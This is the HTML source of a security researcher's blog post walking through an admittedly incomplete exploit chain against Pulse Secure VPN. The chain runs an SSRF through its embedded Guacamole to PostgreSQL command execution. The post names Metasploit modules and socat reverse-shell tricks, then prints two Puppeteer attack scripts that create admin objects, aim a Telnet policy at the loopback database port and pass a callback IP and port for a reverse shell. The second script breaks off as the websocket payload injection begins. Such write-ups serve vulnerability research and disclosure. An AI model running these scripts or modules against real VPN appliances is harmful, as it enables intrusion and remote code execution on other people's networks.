@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <script async src="/js/custom.js"></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5">
+<meta name="generator" content="Hugo 0.57.2" />
+
+    
+    
+    
+
+<title>Failed02 Pulse Secure VPN and Guacamole WebSocket Hooking • Think
+Love
+Share</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Failed02 Pulse Secure VPN and Guacamole WebSocket Hooking"/>
+<meta name="twitter:description" content="Just an incomplete exploit chain worth sharing. It&#39;ll show an attempt to exploiting Pulse Secure VPN through its guacamole and postgres components. It implies socat, metasploit, puppeteer, and WebSocket hooking!"/>
+
+<meta property="og:title" content="Failed02 Pulse Secure VPN and Guacamole WebSocket Hooking" />
+<meta property="og:description" content="Just an incomplete exploit chain worth sharing. It&#39;ll show an attempt to exploiting Pulse Secure VPN through its guacamole and postgres components. It implies socat, metasploit, puppeteer, and WebSocket hooking!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://thinkloveshare.com/hacking/failed02_pulse_secure_vpn_guacamole_websocket_hooking/" />
+<meta property="article:published_time" content="2021-12-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-12-18T00:00:00+00:00" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container sidebar-about ">
+      <span class="site__title">
+        <a href="https://thinkloveshare.com/">Think
+Love
+Share</a>
+      </span>
+          <a href="https://thinkloveshare.com/">
+          
+          
+          
+          <div class="author-image">
+            <img src="https://thinkloveshare.com/img/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+      <p class="site__description">
+        <a href="https://thinkloveshare.com/">
+         InfoSec, Code, Thoughts &amp; Feels 
+      </a>
+      </p>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/hacking/">
+						<span>Hacking</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/coding/">
+						<span>Coding</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/the_rest/">
+						<span>The Rest</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/travels/">
+						<span>Travels</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/TheLaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://github.com/Laluka" rel="me"><i class="rotate fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://gitlab.com/TheLaluka" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://linkedin.com/in/louka-jacques-chevallier-6b2460125" rel="me"><i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+  
+</section>
+
+    </p>
+    <p class="copyright">
+      &copy; 2021 Laluka.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>Failed02 Pulse Secure VPN and Guacamole WebSocket Hooking</h1>
+    
+    
+<div class="post__meta">
+    
+      <i class="fas fa-calendar-alt"></i> Dec 18, 2021
+    
+    
+    <i class="fas fa-clock"></i> 20 min read
+    <i class="fas fa-globe"></i>
+    
+    Non traduit
+    
+    <br/> <i class="fas fa-heart"></i>Any typos? Any idea to suggest? Feedback appreciated!<i class="fas fa-heart"></i><br/>
+</div>
+
+
+  </header>
+  <hr/>
+  <div class="post">
+    
+
+<h2 id="second-article-of-the-failed-series">Second article of the Failed series!</h2>
+
+<p>We often read articles or research that explain how to exploit X or how Y works. Most of the time this seems straightforward, and yet we all struggle doing our own research. We &ldquo;know&rdquo; that failing is &ldquo;normal&rdquo;, it&rsquo;s part of the process, yet it can hurt or make you feel bad.</p>
+
+<blockquote>
+<p>The path I now want to take, is the wrong one. The one that leads to nothing.</p>
+</blockquote>
+
+<p>One last thing before we begin! <br />
+If you find something cool to add, or a way to make these exploits successful, I&rsquo;d be happy to have you for a guest-post!</p>
+
+<hr />
+
+<p>Talk recording (RTFMeet) incoming, brace yourself :)</p>
+
+<hr />
+
+<h1 id="pulse-secure-vpn-and-guacamole-websocket-hooking">Pulse Secure VPN and Guacamole WebSocket Hooking</h1>
+
+<blockquote>
+<p>Side note: I gave a talk the 18th of December 2021 in Paris about this research. So instead of writing a regular blogpost, I&rsquo;ll try something different and walk you through the talk with the same slides. Feedbacks on whether this is a <code>good</code> or <code>bad</code> approach are more than welcome! :)</p>
+</blockquote>
+
+<p><img class="img_full" src="png-01.png" alt="png-01"></p>
+
+<h1 id="1-catch-up-on-guacamole">1. Catch-Up on Guacamole</h1>
+
+<p>Guacamole is still (no, really?) a protocolar gateway that can be used to telnet/ssh/vnc/rdp/anything from your browser into another device on the adjacent network. If you&rsquo;re not familiar with this technology, please read the first part here: <a href="/hacking/hacking_guacamole_to_trigger_avocado/">RCE with SSRF and File Write as an exploit chain on Apache Guacamole</a></p>
+
+<p><img class="img_full" src="png-03.png" alt="png-03"></p>
+
+<p>Please note the difference between the guacamole software (middle) and THE guacamole (left) made by <a href="https://www.instagram.com/fitfait_bienfait/">@FitFait_BienFait</a> while I&rsquo;m wasting time (many nights) on bugs that lead to nothing..</p>
+
+<h1 id="2-a-real-life-target">2. A Real Life Target</h1>
+
+<p>Now, let&rsquo;s talk about our little guest: Pulse Secure VPN</p>
+
+<p>This is <code>indeed</code> a VPN, and luckily, guacamole is one of its internal components! Here is a screenshot of its main admin panel with some stats and version information.</p>
+
+<p><img class="img_full" src="png-06.png" alt="png-06"></p>
+
+<p>Over the past years, <a href="https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html">many vulnerabilities</a> have been found, going from pre-auth file read to post-auth command injection. Both have proofs of concept and have been found by <a href="https://twitter.com/orange_8361">Orange Tsai</a> (along with others issues).</p>
+
+<p><img class="img_full" src="png-07.png" alt="png-07"></p>
+
+<p>One other really cool vulnerability that doesn&rsquo;t have (yet?) its public proof of concept is a pre-auth use after free that leads to remote code execution. Sexy! Isn&rsquo;t it?</p>
+
+<p>What this means is that there this is a cool playground to have fun with, AND it has guacamole embedded, which is extra-nice for us!</p>
+
+<p><img class="img_full" src="png-08.png" alt="png-08"></p>
+
+<h1 id="3-debug-process">3. Debug Process</h1>
+
+<p>When it comes to vulnerability findings, there are two very different worlds. Some folks prefer a black-box approach, they try to understand what happens under the hood, make assumptions on what could be done, bypassed, and so on.</p>
+
+<p>The other kind (that I am part of) really feel the need to have more insights on what&rsquo;s inside. What does the code really do? What interactions and components are in place? Can we plug a debugger into it? The clearer it gets, the easier it is to find odd behaviors and turn them into vulnerabilities afterward.</p>
+
+<p>With Pulse Secure VPN (now shortened <code>pulse</code>), we&rsquo;re either offered a LILO boot menu, or during runtime a restricted CLI interface allowing a few tweaks. No pain, no shell, sad soup.</p>
+
+<p><img class="img_full" src="png-10.png" alt="png-10"></p>
+
+<p>Of course it&rsquo;s still possible to use known vulnerabilities on the past versions, but when it comes to the latest one, how can we get a shell on our target?</p>
+
+<p>Well, I tried a few approaches that were really nice fails!</p>
+
+<ol>
+<li>Trying to unpack the vmdk file (downloaded from their official website), modify scripts, repack, run, and shell. This failed mostly because I&rsquo;m not good at reversing stuff and the VM was decrypting most of its components at runtime. Overall, I didn&rsquo;t spend enough time on it, could have worked, eventually, maybe..</li>
+<li>Trying to boot the VM, take a snapshot, inject a shellcode in the snapshot, restart the VM, and woosh! Crash because of memory corruption and/or integrity checksums. Yay.</li>
+<li>Find a new remote code execution the black-box way. Welp, life&rsquo;s not an easy thing, I guess..</li>
+</ol>
+
+<p>I was slowly getting discouraged and willing to spend more time on the first idea, but I asked a colleague if he had a bright idea. He laughed. What he had was better than an idea, he had already read the LILO doc!</p>
+
+<p>I tried to spawn a debug shell within LILO, but hey, there is no need to find a submenu when you <code>can actually just append options to the boot-line</code> from the boot menu. I&hellip; Had no clue that it could work that way.</p>
+
+<p>Once again, <code>many thanks</code> Grumpy Old Hacker! ❤️</p>
+
+<p><img class="img_full" src="png-11.png" alt="png-11"></p>
+
+<p>As explained a bit earlier, I also spawned an easy shell with <code>metasploit</code> and its <code>exploit/linux/http/pulse_secure_gzip_rce</code> module. It was clean, easy, fast, convenient, and brain-dead. I did most of my research on the 9.1R8 research which is quite old, but whatever, I was just interested in guacamole.. :)</p>
+
+<p><img class="img_full" src="png-12.png" alt="png-12"></p>
+
+<p>Ok. We now have a shell, upload, and download features. But there are no tools, no <code>find</code>, no <code>file</code>, no <code>grep</code>, no <code>tcpdump</code>, etc etc etc. It&rsquo;s not helping much, but it&rsquo;s a good start!</p>
+
+<p>Now I used a trick (tool) that I loooove so much: <a href="https://github.com/minos-org/minos-static">minos-static</a></p>
+
+<p>This tool exposes many recipes one can use to build static binaries, as well as the precompiled binaries as well. It&rsquo;s incredibly convenient. Think about it, you spawn a shell on a remote target, you drop a static <code>socat</code> and <code>tmux</code> there, and woosh, you now have a reverse tty, with signals, right-left keys, auto-completion, no risks to kill your shell with a ctrl^C, and even better, with tmux you can have many features with such as background processes, multiple windows, panes, shell resize, etc, in a single reverse shell. Yes. You&rsquo;re welcome.</p>
+
+<p>That being said, I used socat all along to have both a reverse pty with multiple windows/panes (tmux &lt;3), but I also used socat to have multiple ports forwarding and byte-dumps. This can be used to capture handshakes, debug exchanges, expose local ports on the public ip, and so on. On the right, you can see a simple way to bypass ssl issues by letting socat take care of everything, and then hit your loopback in plaintext. Once again, a huge time saver.</p>
+
+<p><img class="img_full" src="png-13.png" alt="png-13"></p>
+
+<p>Last but not least, when it comes to long exploit chains, what you really want is to debug every step. One. By. One. <br />
+Trying to fight all your dragons at once will definitely take you to your grave.</p>
+
+<p>In order to obtain our holy grail, our super-duper remote code execution, we&rsquo;ll inspect the following stages:</p>
+
+<ol>
+<li>Find guacamole, verify that our part-1 SSRF is still there</li>
+<li>Verify that we can send arbitrary bytes without limitation and no garbage</li>
+<li>Make sure that arbitrary bytes sent to PostgreSQL leads to our RCE</li>
+<li>Finally, try to chain all the steps, debug, debug, debug&hellip;</li>
+</ol>
+
+<p>Ready? Steady? Go!</p>
+
+<p><img class="img_full" src="png-14.png" alt="png-14"></p>
+
+<h1 id="4-automation-wrapup">4. Automation &amp; WrapUp</h1>
+
+<blockquote>
+<p>Ok, it&rsquo;s small, I know, but I fixed the zoom factor on thinkloveshare, you can now pinch and zooooom in!</p>
+</blockquote>
+
+<p>First things first, can we really get code execution on PostgreSQL that easily? Drop your brain, launch msfconsole, use the module <code>multi/postgres/postgres_copy_from_program_cmd_exec</code>, set the right options, and woosh, meterpreter.</p>
+
+<p>Here&rsquo;s the detail:</p>
+
+<ul>
+<li>Top pane: PostgreSQL in a docker, to test things fast without trashing your main OS</li>
+<li>Bottom left pane: socat doing a port forward, that way we can easily dump the bytes we&rsquo;ll replay later on</li>
+<li>Bottom right pane: <code>msfconsole</code> attacking postgres, no password has been set, we&rsquo;re hitting the loopback!</li>
+</ul>
+
+<p><img class="img_full" src="png-16.png" alt="png-16"></p>
+
+<p>Second screenshot, we still have docker up there and socat on the bottom left pane. But this time, we use metasploit (middle right) only for its <code>exploit/multi/handler</code> feature, and the exploit is just sent with <code>echo</code> and <code>socat</code> to the targeted port. Bottom left, socat is still dumping the same bytes, we&rsquo;re replaying the attack without logic, it still works. Smells good for our SSRF, right?</p>
+
+<p><img class="img_full" src="png-17.png" alt="png-17"></p>
+
+<p>We now know that our PostgreSQL exploit will work smoothly. What about the guacamole side? How can we actually inject arbitrary bytes?</p>
+
+<p>A few words about the guacd protocol. It&rsquo;s really picky, if you take too much time to answer, if the socket dies, or if you don&rsquo;t respect any of the conventions, it&rsquo;ll close the socket right away.</p>
+
+<p>One cool thing tho, is that if you use the copy-paste feature within guacamole, it&rsquo;ll send the data as a base64 encoded payload. We can just inject arbitrary bytes there, it just works.. If you find a way to inject seamlessly in the websocket.</p>
+
+<p>One not-so-cool thing is that while you&rsquo;re sending base64 payloads and keycodes, it only answers with&hellip; Screenshots&hellip; Images&hellip; Literally <code>GET RECT</code> mate.</p>
+
+<p><img class="img_full" src="png-18.png" alt="png-18"></p>
+
+<p>Fiiine, in order to send your arbitrary bytes, some difficulties come in place. I was just trying to test the attack, but couldn&rsquo;t find efficient tooling, here are a few dead-ends:</p>
+
+<ul>
+<li>You can&rsquo;t use match-and-replace features on websockets in BurpSuite (at least I did not succeed)</li>
+<li>You can re-open a websocket, but then guacd protocol breaks</li>
+<li>Other proxies (tried with mitm-framework) don&rsquo;t work smoothly (yet?) with websockets, so implementing our own match-and-replace isn&rsquo;t that easy</li>
+<li>Listing and injecting in websockets in a browser while having the connection open isn&rsquo;t an easy task</li>
+<li>Identifying where the javascript sends the base64 was hard, there were too many sinks and messy javascript</li>
+<li>Burp crashes</li>
+<li>Burp crashes</li>
+<li>Burp crashes</li>
+<li>Burp crashes again&hellip; :@</li>
+</ul>
+
+<p><img class="img_full" src="png-19.png" alt="png-19"></p>
+
+<p>So even if I wanted to test the exploit stages without coding a full exploit, there was just no easy way! Implementing the whole process in python would be messy, the network exchanges are too numerous, it would be really painful and time consuming.</p>
+
+<p><a href="https://github.com/puppeteer/puppeteer">Puppeteer</a> to the rescue! Ever heard of it? It allows you to drive a browser with javascript code, as well as have many cool debug features and more control over what happens under the hood. This means that all the heavy lifting will be done for us, yay!</p>
+
+<p><img class="img_full" src="png-20.png" alt="png-20"></p>
+
+<h3 id="a-few-puppeteer-tips">A few puppeteer tips</h3>
+
+<p>It can be hard to get started once you&rsquo;re done playing with the default scripts that allow you to take a screenshot and save a page. But one thing that I want you to realize, is that you don&rsquo;t need to &ldquo;know how to code well&rdquo; in order to script stuff. The chrome developer tools are here for you, and they do most of the work for you!</p>
+
+<p>I used the following workflow to develop this exploit:</p>
+
+<ol>
+<li>Install &amp; Setup puppeteer to use an http proxy (code below), here I used BurpSuite</li>
+<li>Make puppeteer go to a specific page and comment the <code>browser.close()</code> statment so the browser stays open</li>
+<li>Open the chrome developer tools and select the js, dom, or xpath selector of the item you want to interact with</li>
+<li>Implement the interaction that you need to reproduce (with auto-completion!!) in the chrome debugger</li>
+<li>Once it works in the debugger, add the lines to your script and go back to step 2! :)</li>
+</ol>
+
+<p>Eventually, after many runs, you&rsquo;ll have all your actions scripted, and you still can debug easily and see through your exploit with the proxy in place.</p>
+
+<p>Of course there are some puppeteer quirks that you can use to bind the chrome debugger output to your shell stdout, hook events, or even mitm your browser without proxy. But most of the time, it&rsquo;s as simple as the workflow described above.</p>
+
+<blockquote>
+<p>Last pro tip: Yes, <a href="https://github.com/miyakogi/pyppeteer">pyppeteer</a> is a thing, but I <em>really</em> think that using python as a wrapper for javascript is a bad idea. You&rsquo;ll just end up having too many bugs, missing bindings, and loose all the advantages of easy asynchronous javascript. Lastly, it&rsquo;s much more convenient to inject javascript in a browser, using javascript. So don&rsquo;t go for <code>pypeteer</code>, learn javascript. For the right needs, use the right tools, not just &ldquo;what you already know&rdquo; ^.^</p>
+</blockquote>
+
+<h2 id="show-me-the-code">Show me the code!</h2>
+
+<p>Here is the final exploit, it&rsquo;s 300 lines of javascript, driving puppeteer. It took something like 6 hours to code and debug ans is composed of two files:</p>
+
+<ol>
+<li>First part logs-in as an administrator, ceates an authentication server, a realm, a user, a policy, a user resource (aka guacamole access), and binds everything together. It. Was. Painful.</li>
+<li>Second part is the regular user logging in with the right realm, using the previously created guacamole access that will connect its browser to the loopback, port 5432 (PostgreSQL).</li>
+</ol>
+
+<p><img class="img_full" src="png-21.png" alt="png-21"></p>
+
+<h3 id="first-exploit">First exploit</h3>
+
+<pre><code class="language-javascript">/*
+    Author: @TheLaluka
+    npm i puppeteer
+    node 01-sploit-admin.js
+*/
+
+const puppeteer = require(&quot;puppeteer&quot;);
+const base_url = &quot;https://my.pulse&quot;;
+(async() =&gt; {
+
+    const delay = ms =&gt; new Promise(resolve =&gt; setTimeout(resolve, ms))
+
+    // Setup browser
+    console.log(&quot;[+] Setup browser&quot;)
+    const browser = await puppeteer.launch({
+        headless: false,
+        ignoreHTTPSErrors: true,
+        defaultViewport: null,
+        // args: ['--proxy-server=127.0.0.1:8080']
+    })
+    const page = (await browser.pages())[0]
+
+    // Login admin
+    console.log(&quot;[+] Login admin&quot;)
+    await page.goto(base_url + &quot;/dana-na/auth/url_admin/welcome.cgi&quot;)
+    await page.waitForSelector('#username');
+    await page.type(&quot;#username&quot;, &quot;admin&quot;)
+    await page.type(&quot;#password&quot;, &quot;choubidouce&quot;)
+    await page.click(&quot;#btnSubmit_6&quot;)
+
+    try {
+        await page.waitForSelector(&quot;[name='btnContinue']&quot;, {
+            timeout: 1000 // Continue if previous session established
+        })
+        if (await page.$(&quot;[name='btnContinue']&quot;) !== null) {
+            await page.click(&quot;[name='btnContinue']&quot;);
+            console.log(&quot;[+] Previous session found, continuing&quot;)
+        }
+    } catch (e) {
+        console.log(&quot;[+] No previous session, continuing&quot;)
+    }
+
+    // Create server
+    console.log(&quot;[+] Create server&quot;)
+    await page.setExtraHTTPHeaders({ referer: base_url + &quot;/dana-admin/misc/admin.cgi&quot; })
+    await page.goto(base_url + &quot;/dana-admin/auth/listServers.cgi&quot;)
+    await page.waitForSelector(&quot;#ServerType&quot;)
+    await page.evaluate(() =&gt; {
+        $(&quot;#ServerType option:contains('Local Authentication')&quot;)[0].selected = true
+    })
+    await page.waitForSelector(&quot;#btnCreateNewServer&quot;)
+    await page.click(&quot;#btnCreateNewServer&quot;)
+    await page.waitForSelector(&quot;#txtReferenceName_5&quot;)
+
+    var server = &quot;server&quot; + Date.now()
+    await page.type(&quot;#txtReferenceName_5&quot;, server)
+    await page.click(&quot;#btnSaveServerChanges_1&quot;)
+    console.log(&quot;[*] Server created: &quot; + server)
+    await page.waitForSelector(&quot;#frmAuthServer&quot;)
+
+    // Goto users
+    console.log(&quot;[+] Goto users&quot;)
+    linkHandlers = await page.$x(&quot;//*[@id='frmAuthServer']/ul/li[2]/a&quot;);
+    if (linkHandlers.length &gt; 0) {
+        await linkHandlers[0].click();
+    } else {
+        console.log(&quot;[-] Users button not found&quot;)
+        process.exit(1)
+    }
+    await page.waitForSelector(&quot;#btnNew_32&quot;)
+    await page.click(&quot;#btnNew_32&quot;)
+
+    // Create user
+    console.log(&quot;[+] Create user&quot;)
+    await page.waitForSelector(&quot;#login&quot;)
+    var user_name = &quot;user&quot; + Date.now()
+    var user_passord = &quot;petitfromageaupoivre&quot; + Date.now()
+    await page.type(&quot;#login&quot;, user_name)
+    await page.type(&quot;#name_10&quot;, user_name)
+    await page.type(&quot;#passwd&quot;, user_passord)
+    await page.type(&quot;#confirm_passwd&quot;, user_passord)
+    await page.click(&quot;#AddLocalUser&quot;)
+    console.log(&quot;[*] User created: &quot; + user_name + &quot; : &quot; + user_passord)
+
+    // Create new role
+    console.log(&quot;[+] Create new role&quot;)
+    await page.setExtraHTTPHeaders({ referer: base_url + &quot;/dana-admin/misc/admin.cgi&quot; })
+    await page.goto(base_url + &quot;/dana-admin/roles/roles.cgi?btnNew=1&quot;)
+    await page.waitForSelector(&quot;#txtName_40&quot;)
+    var role = &quot;role&quot; + Date.now()
+    await page.type(&quot;#txtName_40&quot;, role)
+    await page.type(&quot;#txtDescription_27&quot;, role)
+    await page.click(&quot;#chkHTML5Acc&quot;)
+    await page.click(&quot;#btnCreate_3&quot;)
+    console.log(&quot;[*] Role created: &quot; + role)
+
+    // Create new realm
+    console.log(&quot;[+] Create new realm&quot;)
+    await page.setExtraHTTPHeaders({ referer: base_url + &quot;/dana-admin/misc/admin.cgi&quot; })
+    await page.goto(base_url + &quot;/dana-admin/realm/listRealms.cgi&quot;)
+    await page.waitForSelector(&quot;#btnNewPolicyRealm&quot;)
+    await page.click(&quot;#btnNewPolicyRealm&quot;)
+
+    await page.waitForSelector(&quot;#txtRealmName_3&quot;)
+    var realm = &quot;realm&quot; + Date.now()
+    await page.type(&quot;#txtRealmName_3&quot;, realm)
+    await page.type(&quot;#txtDescription_25&quot;, realm)
+
+    selectHandler = await page.$x(&quot;//option[contains(., '&quot; + server + &quot;')]&quot;);
+    if (selectHandler.length &gt; 0) {
+        server_value = await selectHandler[0].evaluate(domElement =&gt; { return domElement.value })
+        await page.select(&quot;select#cmbAuthenServer&quot;, server_value)
+    } else {
+        console.log(&quot;[-] Server option not found&quot;)
+        process.exit(1)
+    }
+    await page.click(&quot;#btnSaveRealmGeneral_1&quot;)
+    console.log(&quot;[*] Realm created: &quot; + realm)
+
+    // Create new role mapping
+    console.log(&quot;[+] Create new role mapping&quot;)
+    await page.waitForSelector(&quot;#btnNewPolicyRule&quot;)
+    await page.click(&quot;#btnNewPolicyRule&quot;)
+
+    var rule = &quot;rule&quot; + Date.now()
+    await page.waitForSelector(&quot;#txtRuleName&quot;)
+    await page.type(&quot;#txtRuleName&quot;, rule)
+    await page.type(&quot;#txtUserNamePatterns&quot;, user_name)
+
+    selectHandler = await page.$x(&quot;//option[contains(., '&quot; + role + &quot;')]&quot;);
+    if (selectHandler.length &gt; 0) {
+        role_value = await selectHandler[0].evaluate(domElement =&gt; { return domElement.value })
+        await page.select(&quot;select#lstAvailableRoles_4&quot;, role_value)
+    } else {
+        console.log(&quot;[-] Role option not found&quot;)
+        process.exit(1)
+    }
+    await page.click(&quot;#btnAddRole&quot;)
+    await page.click(&quot;#btnSaveRuleMapping&quot;)
+    delay(3000)
+
+    // Create new resource policy
+    console.log(&quot;[+] Create new resource policy&quot;)
+    await page.setExtraHTTPHeaders({ referer: base_url + &quot;/dana-admin/misc/admin.cgi&quot; })
+    await page.goto(base_url + &quot;/dana-admin/objects/resource_objects.cgi?object_type=html5acc&quot;)
+    await page.waitForSelector(&quot;#btnNew_20&quot;)
+    await page.click(&quot;#btnNew_20&quot;)
+
+    await page.waitForSelector(&quot;#optHTML5AccType&quot;)
+    selectHandler = await page.$x(&quot;//option[contains(., 'Telnet')]&quot;);
+    if (selectHandler.length &gt; 0) {
+        telnet_value = await selectHandler[0].evaluate(domElement =&gt; { return domElement.value })
+        await page.select(&quot;select#optHTML5AccType&quot;, telnet_value)
+    } else {
+        console.log(&quot;[-] Telnet option not found&quot;)
+        process.exit(1)
+    }
+    delay(3000)
+    var policy = &quot;policy&quot; + Date.now()
+    await page.type(&quot;#txtName_30&quot;, policy)
+    await page.type(&quot;#txtDescription_19&quot;, policy)
+    await page.type(&quot;#txtServer_2&quot;, &quot;127.0.0.1&quot;) // Hit the loopback for ssrf
+    await page.evaluate(() =&gt; document.getElementById(&quot;txtServerPort&quot;).value = &quot;&quot;) // Reset dummy port
+    await page.type(&quot;#txtServerPort&quot;, &quot;5432&quot;) // Set postgresql default port
+        // await page.type(&quot;#txtServerPort&quot;, &quot;5555&quot;) // If you want to debug with socat exposing port 5555 on 0.0.0.0
+    await page.click(&quot;#btnSave_58&quot;)
+    console.log(&quot;[*] Polict created: &quot; + policy)
+    delay(3000)
+
+    // Assign role to policy
+    console.log(&quot;[+] Assign role to policy&quot;)
+    await page.waitForSelector(&quot;#lstAvailableUserRoles_1&quot;)
+
+    selectHandler = await page.$x(&quot;//option[contains(., '&quot; + role + &quot;')]&quot;);
+    if (selectHandler.length &gt; 0) {
+        role_value = await selectHandler[0].evaluate(domElement =&gt; { return domElement.value })
+        await page.select(&quot;select#lstAvailableUserRoles_1&quot;, role_value)
+    } else {
+        console.log(&quot;[-] Role option not found&quot;)
+        process.exit(1)
+    }
+    await page.click(&quot;#btnUserRolesAdd&quot;)
+    await page.click(&quot;#btnSave_57&quot;)
+    
+    // delay(3000)
+    await browser.close()
+
+    console.log(&quot;[!] All done here, now run&quot;)
+
+    // console.log(&quot;node 02-sploit-user.js &quot; + user_name + &quot; &quot; + user_passord + &quot; &quot; + realm + &quot; &quot; + policy + &quot; IP PORT&quot;)
+    // Yup, hardcoded IP, I never took the time to automate the payload generation with msfconsole / msfvenom :)
+    console.log(&quot;node 02-sploit-user.js &quot; + user_name + &quot; &quot; + user_passord + &quot; &quot; + realm + &quot; &quot; + policy + &quot; 192.168.1.25 4444&quot;)
+})();
+</code></pre>
+
+<h3 id="second-exploit">Second exploit</h3>
+
+<pre><code class="language-javascript">/*
+    Author: @TheLaluka
+    run node 01-sploit-admin.js before this script
+*/
+
+const puppeteer = require(&quot;puppeteer&quot;);
+
+if (process.argv.length != 8) {
+    console.log(&quot;Fcked up arguments, run node 01-sploit-admin.js before this script&quot;)
+    console.log(&quot;ex: node 02-sploit-user.js userXXX petitfromageaupoivreXXX realmXXX policyXXX IP PORT&quot;)
+    process.exit(1)
+} else {
+    user_name = process.argv[2]
+    console.log(&quot;[+] user_name: &quot; + user_name)
+    user_passord = process.argv[3]
+    console.log(&quot;[+] user_passord: &quot; + user_passord)
+    realm = process.argv[4]
+    console.log(&quot;[+] realm: &quot; + realm)
+    policy = process.argv[5]
+    console.log(&quot;[+] policy: &quot; + policy)
+    ip = process.argv[6]
+    console.log(&quot;[+] ip: &quot; + ip)
+    port = process.argv[7]
+    console.log(&quot;[+] port: &quot; + port)
+}
+
+(async() =&gt; {
+    const delay = ms =&gt; new Promise(resolve =&gt; setTimeout(resolve, ms))
+
+    // Setup browser
+    console.log(&quot;[+] Setup browser&quot;)
+    const browser = await puppeteer.launch({
+        headless: false,
+        ignoreHTTPSErrors: true,
+        defaultViewport: null,
+        devtools: false
+    })
+    const page = (await browser.pages())[0]
+
+    // await delay(3000)
+
+    // Login user
+    console.log(&quot;[+] Login user&quot;)
+    await page.goto(&quot;https://my.pulse/dana-na/auth/url_default/welcome.cgi&quot;)
+    await page.waitForSelector('#username');
+    await page.type(&quot;#username&quot;, user_name)
+    await page.type(&quot;#password&quot;, user_passord)
+    await page.$eval('#realm_16', (el, realm) =&gt; {
+        el.value = realm;
+    }, realm);
+    await page.click(&quot;#btnSubmit_6&quot;)
+
+    try {
+        await page.waitForSelector(&quot;#btnContinue&quot;, {
+            timeout: 1000 // Continue if previous session established
+        })
+        await page.click(&quot;#btnContinue&quot;);
+        console.log(&quot;[+] Previous session found, continuing&quot;)
+    } catch (e) {
+        console.log(&quot;[+] No previous session, continuing&quot;)
+    }
+
+    // Open Html5 access on netcat
+    console.log(&quot;[+] Open Html5 access on netcat&quot;)
+    await page.waitForSelector(&quot;#table_html5accline_2_0 &gt; tbody &gt; tr &gt; td:nth-child(2) &gt; a&quot;)
+    linkHandlers = await page.$x(&quot;//a[contains(., '&quot; + policy + &quot;')]&quot;);
+    if (linkHandlers.length &gt; 0) {
+        await linkHandlers[0].click();
+    } else {
+        console.log(&quot;[-] Policy link not found&quot;)
+        process.exit(1)
+    }
+
+    // Sending SSRF to postgres
+    console.log(&quot;[+] Sending SSRF to postgres&quot;)
+    await page.waitForSelector(&quot;#content&quot;)
+    await page.focus(&quot;#content&quot;)
+
+    // Hooking the websocket
+    console.log(&quot;[+] Hooking the websocket&quot;)
+
+    // Hook the chrome console to node console to print browser logs in the shell
+    // page.on('console', consoleObj =&gt; console.log(consoleObj))
+
+
+    await page.evaluate(() =&gt; {
+        // Remember to update the payload here
